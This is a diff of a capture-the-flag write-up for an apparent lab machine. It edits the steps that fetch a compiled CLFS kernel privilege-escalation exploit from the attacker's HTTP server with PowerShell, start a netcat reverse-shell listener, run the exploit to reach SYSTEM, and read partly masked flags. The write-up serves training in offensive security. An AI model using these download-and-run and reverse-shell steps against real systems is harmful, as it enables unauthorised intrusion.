@@ -127,7 +127,7 @@ We're in as `aero\sam.emerson`.
 ### user.txt
 
 ```console
-$ cat user.txt
+PS> cat user.txt
 8e12dd47************************
 ```
 
@@ -179,24 +179,28 @@ Build with Ctrl+Shift+B. It compiles successfully.
 
 ### Exploitation
 
-Transfer the compiled exploit to the target:
+Transfer the compiled exploit to the target. On my Kali box, start an HTTP server:
 
 ```console
 $ python3 -m http.server
 ```
 
+Then on the target, download it:
+
 ```console
-$ iwr http://10.10.15.229:8000/clfs_eop.exe -outfile clfs_eop.exe
+PS> iwr http://10.10.15.229:8000/clfs_eop.exe -outfile clfs_eop.exe
 ```
 
-Start a new listener and run the exploit:
+Start a new listener on Kali:
 
 ```console
 $ rlwrap nc -lvnp 9002
 ```
 
+And run the exploit on the target:
+
 ```console
-$ .\clfs_eop.exe
+PS> .\clfs_eop.exe
 ```
 
 The CLFS exploit corrupts log file metadata to get a kernel write primitive, escalates to SYSTEM, and fires the reverse shell.
@@ -208,7 +212,7 @@ We're SYSTEM.
 ### root.txt
 
 ```console
-# cat root.txt
+PS# cat root.txt
 7a896840************************
 ```
 
